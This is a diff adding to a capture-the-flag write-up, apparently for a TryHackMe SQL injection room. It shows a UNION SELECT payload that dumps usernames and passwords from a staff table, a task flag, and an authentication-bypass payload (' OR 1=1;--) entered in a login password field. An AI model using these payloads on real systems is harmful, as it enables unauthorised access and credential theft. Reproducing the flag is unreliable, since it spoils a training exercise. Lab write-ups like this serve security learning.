@@ -67,3 +67,9 @@ We get all the columns name of `stuff_users` table
     0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
 ![password](images/15-password.png)<br/>
 #### A: `THM{SQL_INJECTION_3840}` :heavy_check_mark:<br/>
+
+## Task 6: Blind SQLi - Authentication Bypass
+### Q: What is the flag after completing level two? (and moving to level 3)
+    username anything and password field ' OR 1=1;--
+![sqli in password](images/16-sqli-in-pwd.png)<br/>
+![next button](images/17-click-next.png)<br/>
